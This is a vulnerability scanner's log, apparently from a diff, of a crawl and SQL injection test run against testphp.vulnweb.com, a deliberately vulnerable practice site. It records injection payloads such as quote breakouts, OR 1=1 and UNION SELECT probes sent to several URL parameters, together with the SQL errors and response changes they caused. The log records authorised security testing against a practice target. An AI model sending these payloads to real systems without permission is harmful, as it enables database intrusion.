+2025-11-10 11:17:12,012 INFO: Crawled: http://testphp.vulnweb.com/index.php (total 2)
+2025-11-10 11:17:12,907 INFO: Crawled: http://testphp.vulnweb.com/categories.php (total 3)
+2025-11-10 11:17:13,827 INFO: Crawled: http://testphp.vulnweb.com/artists.php (total 4)
+2025-11-10 11:17:14,823 INFO: Crawled: http://testphp.vulnweb.com/disclaimer.php (total 5)
+2025-11-10 11:17:15,755 INFO: Crawled: http://testphp.vulnweb.com/cart.php (total 6)
+2025-11-10 11:17:16,728 INFO: Crawled: http://testphp.vulnweb.com/guestbook.php (total 7)
+2025-11-10 11:17:17,672 INFO: Crawled: http://testphp.vulnweb.com/AJAX/index.php (total 8)
+2025-11-10 11:17:18,451 INFO: Crawled: http://testphp.vulnweb.com/login.php (total 9)
+2025-11-10 11:17:19,590 INFO: Crawled: http://testphp.vulnweb.com/userinfo.php (total 10)
+2025-11-10 11:17:21,287 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/ (total 11)
+2025-11-10 11:17:22,138 INFO: Crawled: http://testphp.vulnweb.com/hpp/ (total 12)
+2025-11-10 11:17:23,108 INFO: Crawled: http://testphp.vulnweb.com/search.php?test=query (total 13)
+2025-11-10 11:17:23,920 INFO: Crawled: http://testphp.vulnweb.com/style.css (total 14)
+2025-11-10 11:17:24,909 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=1 (total 15)
+2025-11-10 11:17:25,687 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=2 (total 16)
+2025-11-10 11:17:26,487 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=3 (total 17)
+2025-11-10 11:17:27,307 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=4 (total 18)
+2025-11-10 11:17:28,087 INFO: Crawled: http://testphp.vulnweb.com/artists.php?artist=1 (total 19)
+2025-11-10 11:17:29,020 INFO: Crawled: http://testphp.vulnweb.com/artists.php?artist=2 (total 20)
+2025-11-10 11:17:29,842 INFO: Crawled: http://testphp.vulnweb.com/artists.php?artist=3 (total 21)
+2025-11-10 11:17:30,652 INFO: Crawled: http://testphp.vulnweb.com/AJAX/styles.css (total 22)
+2025-11-10 11:17:31,587 INFO: Crawled: http://testphp.vulnweb.com/signup.php (total 23)
+2025-11-10 11:17:32,561 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/ (total 24)
+2025-11-10 11:17:33,496 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/ (total 25)
+2025-11-10 11:17:34,467 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/ (total 26)
+2025-11-10 11:17:35,436 INFO: Crawled: http://testphp.vulnweb.com/hpp/?pp=12 (total 27)
+2025-11-10 11:17:36,234 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=1 (total 28)
+2025-11-10 11:17:37,558 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg (total 29)
+2025-11-10 11:17:38,410 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=2 (total 30)
+2025-11-10 11:17:39,289 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg (total 31)
+2025-11-10 11:17:40,246 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=3 (total 32)
+2025-11-10 11:17:41,073 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg (total 33)
+2025-11-10 11:17:41,999 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=4 (total 34)
+2025-11-10 11:17:43,268 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg (total 35)
+2025-11-10 11:17:44,228 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=5 (total 36)
+2025-11-10 11:17:45,352 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg (total 37)
+2025-11-10 11:17:46,189 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=7 (total 38)
+2025-11-10 11:17:47,429 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg (total 39)
+2025-11-10 11:17:48,410 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=6 (total 40)
+2025-11-10 11:17:49,199 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg (total 41)
+2025-11-10 11:17:50,015 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?artist=1 (total 42)
+2025-11-10 11:17:50,849 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?artist=2 (total 43)
+2025-11-10 11:17:51,620 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?artist=3 (total 44)
+2025-11-10 11:17:52,409 INFO: Crawled: http://testphp.vulnweb.com/secured/newuser.php (total 45)
+2025-11-10 11:17:53,192 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/ (total 46)
+2025-11-10 11:17:54,154 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html (total 47)
+2025-11-10 11:17:54,945 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/ (total 48)
+2025-11-10 11:17:55,759 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html (total 49)
+2025-11-10 11:17:56,705 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/ (total 50)
+2025-11-10 11:17:57,663 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html (total 51)
+2025-11-10 11:17:58,430 INFO: Crawled: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12 (total 52)
+2025-11-10 11:17:59,265 INFO: Crawled: http://testphp.vulnweb.com/secured/style.css (total 53)
+2025-11-10 11:18:01,189 INFO: Found path: http://testphp.vulnweb.com/admin (status 200)
+2025-11-10 11:18:51,256 INFO: Testing parameters at: http://testphp.vulnweb.com/search.php?test=query
+2025-11-10 11:18:52,870 INFO: [SQLi] test=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/search.php?test=query%27
+2025-11-10 11:18:52,870 INFO: [SQLi-LEN] test=' caused response size delta at http://testphp.vulnweb.com/search.php?test=query%27
+2025-11-10 11:18:52,876 INFO: [SQLi-DOM] test=' caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/search.php?test=query%27
+2025-11-10 11:18:57,186 INFO: [SQLi] test=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/search.php?test=query%27%29--
+2025-11-10 11:18:57,187 INFO: [SQLi-LEN] test=')-- caused response size delta at http://testphp.vulnweb.com/search.php?test=query%27%29--
+2025-11-10 11:18:57,196 INFO: [SQLi-DOM] test=')-- caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/search.php?test=query%27%29--
+2025-11-10 11:18:57,995 INFO: [SQLi] test=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/search.php?test=query%27+UNION+SELECT+NULL--
+2025-11-10 11:18:57,995 INFO: [SQLi-LEN] test=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/search.php?test=query%27+UNION+SELECT+NULL--
+2025-11-10 11:18:57,997 INFO: [SQLi-DOM] test=' UNION SELECT NULL-- caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/search.php?test=query%27+UNION+SELECT+NULL--
+2025-11-10 11:18:58,920 INFO: [SQLi] test=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/search.php?test=query%27+OR+1%3D1--
+2025-11-10 11:18:58,920 INFO: [SQLi-LEN] test=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/search.php?test=query%27+OR+1%3D1--
+2025-11-10 11:18:58,925 INFO: [SQLi-DOM] test=' OR 1=1-- caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/search.php?test=query%27+OR+1%3D1--
+2025-11-10 11:18:59,718 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?cat=1
+2025-11-10 11:19:01,349 INFO: [SQLi] cat=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%27
+2025-11-10 11:19:01,349 INFO: [SQLi-LEN] cat=' caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%27
+2025-11-10 11:19:01,355 INFO: [SQLi-DOM] cat=' caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=1%27
+2025-11-10 11:19:02,305 INFO: [SQLi] cat=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+%271%27%3D%271
+2025-11-10 11:19:02,305 INFO: [SQLi-LEN] cat=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+%271%27%3D%271
+2025-11-10 11:19:02,313 INFO: [SQLi-DOM] cat=' OR '1'='1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+%271%27%3D%271
+2025-11-10 11:19:03,269 INFO: [SQLi] cat=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%22
+2025-11-10 11:19:03,269 INFO: [SQLi-LEN] cat=" caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%22
+2025-11-10 11:19:03,275 INFO: [SQLi-DOM] cat=" caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=1%22
+2025-11-10 11:19:04,060 INFO: [SQLi] cat=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%22+OR+%221%22%3D%221
+2025-11-10 11:19:04,060 INFO: [SQLi-LEN] cat=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%22+OR+%221%22%3D%221
+2025-11-10 11:19:04,072 INFO: [SQLi-DOM] cat=" OR "1"="1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=1%22+OR+%221%22%3D%221
+2025-11-10 11:19:05,031 INFO: [SQLi] cat=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%60
+2025-11-10 11:19:05,031 INFO: [SQLi-LEN] cat=` caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%60
+2025-11-10 11:19:05,040 INFO: [SQLi-DOM] cat=` caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=1%60
+2025-11-10 11:19:05,823 INFO: [SQLi] cat=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%27%29--
+2025-11-10 11:19:05,823 INFO: [SQLi-LEN] cat=')-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%27%29--
+2025-11-10 11:19:05,832 INFO: [SQLi-DOM] cat=')-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=1%27%29--
+2025-11-10 11:19:06,627 INFO: [SQLi] cat=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%27+UNION+SELECT+NULL--
+2025-11-10 11:19:06,627 INFO: [SQLi-LEN] cat=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%27+UNION+SELECT+NULL--
+2025-11-10 11:19:06,637 INFO: [SQLi-DOM] cat=' UNION SELECT NULL-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=1%27+UNION+SELECT+NULL--
+2025-11-10 11:19:07,427 INFO: [SQLi] cat=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1%3D1--
+2025-11-10 11:19:07,428 INFO: [SQLi-LEN] cat=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1%3D1--
+2025-11-10 11:19:07,435 INFO: [SQLi-DOM] cat=' OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1%3D1--
+2025-11-10 11:19:08,225 INFO: [SQLi] cat=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%22+OR+1%3D1--
+2025-11-10 11:19:08,225 INFO: [SQLi-LEN] cat=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%22+OR+1%3D1--
+2025-11-10 11:19:08,233 INFO: [SQLi-DOM] cat=" OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=1%22+OR+1%3D1--
+2025-11-10 11:19:08,235 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?cat=2
+2025-11-10 11:19:10,640 INFO: [SQLi] cat=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%27
+2025-11-10 11:19:10,640 INFO: [SQLi-LEN] cat=' caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%27
+2025-11-10 11:19:10,647 INFO: [SQLi-DOM] cat=' caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=2%27
+2025-11-10 11:19:11,457 INFO: [SQLi] cat=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%27+OR+%271%27%3D%271
+2025-11-10 11:19:11,457 INFO: [SQLi-LEN] cat=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%27+OR+%271%27%3D%271
+2025-11-10 11:19:11,465 INFO: [SQLi-DOM] cat=' OR '1'='1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=2%27+OR+%271%27%3D%271
+2025-11-10 11:19:12,385 INFO: [SQLi] cat=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%22
+2025-11-10 11:19:12,385 INFO: [SQLi-LEN] cat=" caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%22
+2025-11-10 11:19:12,394 INFO: [SQLi-DOM] cat=" caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=2%22
+2025-11-10 11:19:13,351 INFO: [SQLi] cat=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%22+OR+%221%22%3D%221
+2025-11-10 11:19:13,351 INFO: [SQLi-LEN] cat=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%22+OR+%221%22%3D%221
+2025-11-10 11:19:13,360 INFO: [SQLi-DOM] cat=" OR "1"="1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=2%22+OR+%221%22%3D%221
+2025-11-10 11:19:14,319 INFO: [SQLi] cat=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%60
+2025-11-10 11:19:14,319 INFO: [SQLi-LEN] cat=` caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%60
+2025-11-10 11:19:14,325 INFO: [SQLi-DOM] cat=` caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=2%60
+2025-11-10 11:19:15,281 INFO: [SQLi] cat=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%27%29--
+2025-11-10 11:19:15,281 INFO: [SQLi-LEN] cat=')-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%27%29--
+2025-11-10 11:19:15,287 INFO: [SQLi-DOM] cat=')-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=2%27%29--
+2025-11-10 11:19:16,217 INFO: [SQLi] cat=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%27+UNION+SELECT+NULL--
+2025-11-10 11:19:16,218 INFO: [SQLi-LEN] cat=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%27+UNION+SELECT+NULL--
+2025-11-10 11:19:16,224 INFO: [SQLi-DOM] cat=' UNION SELECT NULL-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=2%27+UNION+SELECT+NULL--
+2025-11-10 11:19:17,221 INFO: [SQLi] cat=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%27+OR+1%3D1--
+2025-11-10 11:19:17,225 INFO: [SQLi-LEN] cat=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%27+OR+1%3D1--
+2025-11-10 11:19:17,232 INFO: [SQLi-DOM] cat=' OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=2%27+OR+1%3D1--
+2025-11-10 11:19:18,151 INFO: [SQLi] cat=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%22+OR+1%3D1--
+2025-11-10 11:19:18,151 INFO: [SQLi-LEN] cat=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%22+OR+1%3D1--
+2025-11-10 11:19:18,157 INFO: [SQLi-DOM] cat=" OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/listproducts.php?cat=2%22+OR+1%3D1--
+2025-11-10 11:19:18,157 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?cat=3
+2025-11-10 11:19:19,911 INFO: [SQLi] cat=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%27
+2025-11-10 11:19:19,911 INFO: [SQLi-LEN] cat=' caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%27
+2025-11-10 11:19:19,915 INFO: [SQLi-DOM] cat=' caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=3%27
+2025-11-10 11:19:20,784 INFO: [SQLi] cat=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%27+OR+%271%27%3D%271
+2025-11-10 11:19:20,786 INFO: [SQLi-LEN] cat=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%27+OR+%271%27%3D%271
+2025-11-10 11:19:20,793 INFO: [SQLi-DOM] cat=' OR '1'='1 caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=3%27+OR+%271%27%3D%271
+2025-11-10 11:19:21,574 INFO: [SQLi] cat=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%22
+2025-11-10 11:19:21,575 INFO: [SQLi-LEN] cat=" caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%22
+2025-11-10 11:19:21,577 INFO: [SQLi-DOM] cat=" caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=3%22
+2025-11-10 11:19:22,376 INFO: [SQLi] cat=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%22+OR+%221%22%3D%221
+2025-11-10 11:19:22,376 INFO: [SQLi-LEN] cat=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%22+OR+%221%22%3D%221
+2025-11-10 11:19:22,382 INFO: [SQLi-DOM] cat=" OR "1"="1 caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=3%22+OR+%221%22%3D%221
+2025-11-10 11:19:23,178 INFO: [SQLi] cat=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%60
+2025-11-10 11:19:23,178 INFO: [SQLi-LEN] cat=` caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%60
+2025-11-10 11:19:23,185 INFO: [SQLi-DOM] cat=` caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=3%60
+2025-11-10 11:19:24,068 INFO: [SQLi] cat=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%27%29--
+2025-11-10 11:19:24,068 INFO: [SQLi-LEN] cat=')-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%27%29--
+2025-11-10 11:19:24,076 INFO: [SQLi-DOM] cat=')-- caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=3%27%29--
+2025-11-10 11:19:25,048 INFO: [SQLi] cat=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%27+UNION+SELECT+NULL--
+2025-11-10 11:19:25,048 INFO: [SQLi-LEN] cat=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%27+UNION+SELECT+NULL--
+2025-11-10 11:19:25,053 INFO: [SQLi-DOM] cat=' UNION SELECT NULL-- caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=3%27+UNION+SELECT+NULL--
+2025-11-10 11:19:25,992 INFO: [SQLi] cat=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%27+OR+1%3D1--
+2025-11-10 11:19:25,992 INFO: [SQLi-LEN] cat=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%27+OR+1%3D1--
+2025-11-10 11:19:25,995 INFO: [SQLi-DOM] cat=' OR 1=1-- caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=3%27+OR+1%3D1--
+2025-11-10 11:19:26,945 INFO: [SQLi] cat=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%22+OR+1%3D1--
+2025-11-10 11:19:26,946 INFO: [SQLi-LEN] cat=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%22+OR+1%3D1--
+2025-11-10 11:19:26,947 INFO: [SQLi-DOM] cat=" OR 1=1-- caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=3%22+OR+1%3D1--
+2025-11-10 11:19:26,955 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?cat=4
+2025-11-10 11:19:28,839 INFO: [SQLi] cat=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%27
+2025-11-10 11:19:28,839 INFO: [SQLi-LEN] cat=' caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%27
+2025-11-10 11:19:28,847 INFO: [SQLi-DOM] cat=' caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=4%27
+2025-11-10 11:19:29,674 INFO: [SQLi] cat=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%27+OR+%271%27%3D%271
+2025-11-10 11:19:29,675 INFO: [SQLi-LEN] cat=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%27+OR+%271%27%3D%271
+2025-11-10 11:19:29,682 INFO: [SQLi-DOM] cat=' OR '1'='1 caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=4%27+OR+%271%27%3D%271
+2025-11-10 11:19:30,791 INFO: [SQLi] cat=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%22
+2025-11-10 11:19:30,791 INFO: [SQLi-LEN] cat=" caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%22
+2025-11-10 11:19:30,795 INFO: [SQLi-DOM] cat=" caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=4%22
+2025-11-10 11:19:31,617 INFO: [SQLi] cat=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%22+OR+%221%22%3D%221
+2025-11-10 11:19:31,619 INFO: [SQLi-LEN] cat=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%22+OR+%221%22%3D%221
+2025-11-10 11:19:31,630 INFO: [SQLi-DOM] cat=" OR "1"="1 caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=4%22+OR+%221%22%3D%221
+2025-11-10 11:19:32,557 INFO: [SQLi] cat=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%60
+2025-11-10 11:19:32,557 INFO: [SQLi-LEN] cat=` caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%60
+2025-11-10 11:19:32,559 INFO: [SQLi-DOM] cat=` caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=4%60
+2025-11-10 11:19:33,511 INFO: [SQLi] cat=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%27%29--
+2025-11-10 11:19:33,511 INFO: [SQLi-LEN] cat=')-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%27%29--
+2025-11-10 11:19:33,516 INFO: [SQLi-DOM] cat=')-- caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=4%27%29--
+2025-11-10 11:19:34,326 INFO: [SQLi] cat=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%27+UNION+SELECT+NULL--
+2025-11-10 11:19:34,326 INFO: [SQLi-LEN] cat=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%27+UNION+SELECT+NULL--
+2025-11-10 11:19:34,326 INFO: [SQLi-DOM] cat=' UNION SELECT NULL-- caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=4%27+UNION+SELECT+NULL--
+2025-11-10 11:19:41,231 INFO: [SQLi] cat=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%27+OR+1%3D1--
+2025-11-10 11:19:41,231 INFO: [SQLi-LEN] cat=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%27+OR+1%3D1--
+2025-11-10 11:19:41,231 INFO: [SQLi-DOM] cat=' OR 1=1-- caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=4%27+OR+1%3D1--
+2025-11-10 11:19:42,066 INFO: [SQLi] cat=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%22+OR+1%3D1--
+2025-11-10 11:19:42,066 INFO: [SQLi-LEN] cat=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%22+OR+1%3D1--
+2025-11-10 11:19:42,066 INFO: [SQLi-DOM] cat=" OR 1=1-- caused DOM diff score 0.5555555555555556 @ http://testphp.vulnweb.com/listproducts.php?cat=4%22+OR+1%3D1--
+2025-11-10 11:19:42,066 INFO: Testing parameters at: http://testphp.vulnweb.com/artists.php?artist=1
+2025-11-10 11:19:43,733 INFO: [SQLi] artist=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%27
+2025-11-10 11:19:43,733 INFO: [SQLi-LEN] artist=' caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%27
+2025-11-10 11:19:43,736 INFO: [SQLi-DOM] artist=' caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=1%27
+2025-11-10 11:19:44,520 INFO: [SQLi] artist=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%27+OR+%271%27%3D%271
+2025-11-10 11:19:44,520 INFO: [SQLi-LEN] artist=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%27+OR+%271%27%3D%271
+2025-11-10 11:19:44,523 INFO: [SQLi-DOM] artist=' OR '1'='1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=1%27+OR+%271%27%3D%271
+2025-11-10 11:19:45,338 INFO: [SQLi] artist=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%22
+2025-11-10 11:19:45,338 INFO: [SQLi-LEN] artist=" caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%22
+2025-11-10 11:19:45,342 INFO: [SQLi-DOM] artist=" caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=1%22
+2025-11-10 11:19:46,138 INFO: [SQLi] artist=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%22+OR+%221%22%3D%221
+2025-11-10 11:19:46,138 INFO: [SQLi-LEN] artist=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%22+OR+%221%22%3D%221
+2025-11-10 11:19:46,141 INFO: [SQLi-DOM] artist=" OR "1"="1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=1%22+OR+%221%22%3D%221
+2025-11-10 11:19:46,903 INFO: [SQLi] artist=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%60
+2025-11-10 11:19:46,903 INFO: [SQLi-LEN] artist=` caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%60
+2025-11-10 11:19:46,906 INFO: [SQLi-DOM] artist=` caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=1%60
